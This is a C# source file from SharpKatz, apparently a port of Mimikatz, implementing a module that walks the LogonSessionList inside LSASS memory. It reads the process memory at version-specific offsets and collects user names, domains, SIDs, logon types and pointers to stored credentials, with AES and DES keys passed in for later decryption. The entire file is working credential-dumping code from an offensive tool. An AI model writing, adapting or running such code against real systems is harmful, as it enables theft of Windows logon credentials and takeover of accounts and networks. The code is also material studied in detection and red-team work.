using SharpKatz.Credential;
using System;
using System.Collections.Generic;
using System.Reflection;
using System.Runtime.InteropServices;
using FILETIME = System.Runtime.InteropServices.ComTypes.FILETIME;
using static SharpKatz.Win32.Natives;

namespace SharpKatz.Module
{
    class LogonSessions
    {

        static long max_search_size = 580000;

        static string[] KUHL_M_SEKURLSA_LOGON_TYPE = {
            "UndefinedLogonType",
            "Unknown !",
            "Interactive",
            "Network",
            "Batch",
            "Service",
            "Proxy",
            "Unlock",
            "NetworkCleartext",
            "NewCredentials",
            "RemoteInteractive",
            "CachedInteractive",
            "CachedRemoteInteractive",
            "CachedUnlock"
        };

        [StructLayout(LayoutKind.Sequential)]
        public struct KIWI_BASIC_SECURITY_LOGON_SESSION_DATA
        {
            //PKUHL_M_SEKURLSA_CONTEXT	cLsass;
            //const KUHL_M_SEKURLSA_LOCAL_HELPER * lsassLocalHelper;
            public IntPtr LogonId; //PLUID
            public string UserName; //PNatives.UNICODE_STRING
            public string LogonDomain; //PNatives.UNICODE_STRING
            public int LogonType;
            public int Session;
            public IntPtr pCredentials;
            public IntPtr pSid; //PSID
            public IntPtr pCredentialManager;
            public FILETIME LogonTime;
            public string LogonServer; //PNatives.UNICODE_STRING
        }

        public static int FindCredentials(IntPtr hLsass, IntPtr lsasrvMem, OSVersionHelper oshelper, byte[] iv, byte[] aeskey, byte[] deskey, List<Logon> logonlist)
        {

            uint logonSessionListSignOffset;
            //IntPtr logonSessionListAddr;
            int logonSessionListCount; //*DWORD

            // Search for LogonSessionList signature within lsasrv.dll and grab the offset
            logonSessionListSignOffset = (uint)Utility.OffsetFromSign("lsasrv.dll", oshelper.logonSessionListSign, max_search_size);
            if (logonSessionListSignOffset == 0)
            {
                Console.WriteLine("[x] Error: Could not find LogonSessionList signature\n");
                return 1;
            }
            //Console.WriteLine("[*] LogonSessionList offset found as {0}", logonSessionListSignOffset);

            //logonSessionListAddr = Utility.GetIntPtr(hLsass, lsasrvMem, logonSessionListSignOffset, oshelper.LOGONSESSIONLISTOFFSET);
            logonSessionListCount = Utility.GetInt(hLsass, lsasrvMem, logonSessionListSignOffset, oshelper.LOGONSESSIONSLISTCOUNTOFFSET);

            //Console.WriteLine("[*] LogSessList found at address {0:X}", logonSessionListAddr.ToInt64());
            //Console.WriteLine("[*] LogSessListCount {0}", logonSessionListCount);

            IntPtr current = IntPtr.Zero;

            for (int i = 0; i < logonSessionListCount; i++)
            {
                //Console.WriteLine("[!] logonSessionListCount:"+ logonSessionListCount + " -> Step  : " + i);

                current = Utility.GetIntPtr(hLsass, lsasrvMem, logonSessionListSignOffset, oshelper.LOGONSESSIONLISTOFFSET + (8 * i));
                IntPtr pList = current;

                do
                {
                    byte[] listentryBytes = Utility.ReadFromLsass(ref hLsass, current, oshelper.ListTypeSize);

                    GCHandle pinnedArray = GCHandle.Alloc(listentryBytes, GCHandleType.Pinned);
                    IntPtr listentry = pinnedArray.AddrOfPinnedObject();

                    KIWI_BASIC_SECURITY_LOGON_SESSION_DATA logonsession = new KIWI_BASIC_SECURITY_LOGON_SESSION_DATA
                    {
                        LogonId = IntPtr.Add(listentry, oshelper.LocallyUniqueIdentifierOffset),
                        LogonType = Marshal.ReadInt32(IntPtr.Add(listentry, oshelper.LogonTypeOffset)),//slistentry.LogonType,
                        Session = Marshal.ReadInt32(IntPtr.Add(listentry, oshelper.SessionOffset)),//slistentry.Session
                        pCredentials = new IntPtr(Marshal.ReadInt64(IntPtr.Add(listentry, oshelper.CredentialsOffset))),//slistentry.Credentials,
                        pCredentialManager = new IntPtr(Marshal.ReadInt64(IntPtr.Add(listentry, oshelper.CredentialManagerOffset))),
                        pSid = IntPtr.Add(listentry, oshelper.pSidOffset),
                        LogonTime = Utility.ReadStruct<FILETIME>(IntPtr.Add(listentry, oshelper.LogonTimeOffset + 4))
                    };

                    LUID luid = Utility.ReadStruct<LUID>(logonsession.LogonId);

                    IntPtr pUserName = IntPtr.Add(current, oshelper.UserNameListOffset);
                    IntPtr pLogonDomain = IntPtr.Add(current, oshelper.DomaineOffset);
                    IntPtr pLogonServer = IntPtr.Add(current, oshelper.LogonServerOffset);

                    logonsession.UserName = Utility.ExtractUnicodeStringString(hLsass, Utility.ExtractUnicodeString(hLsass, pUserName));
                    logonsession.LogonDomain = Utility.ExtractUnicodeStringString(hLsass, Utility.ExtractUnicodeString(hLsass, pLogonDomain));
                    logonsession.LogonServer = Utility.ExtractUnicodeStringString(hLsass, Utility.ExtractUnicodeString(hLsass, pLogonServer));

                    ConvertSidToStringSid(Utility.ExtractSid(hLsass, logonsession.pSid), out string stringSid);

                    Logon logon = new Logon(luid)
                    {
                        Session = logonsession.Session,
                        LogonType = KUHL_M_SEKURLSA_LOGON_TYPE[logonsession.LogonType],
                        LogonTime = logonsession.LogonTime,
                        UserName = logonsession.UserName,
                        LogonDomain = logonsession.LogonDomain,
                        LogonServer = logonsession.LogonServer,
                        SID = stringSid,
                        pCredentials = logonsession.pCredentials,
                        pCredentialManager = logonsession.pCredentialManager
                    };
                    logonlist.Add(logon);

                    current = new IntPtr(Marshal.ReadInt64(listentry));

                    pinnedArray.Free();
                } while (current != pList);
            }
            return 0;
        }
    }
}
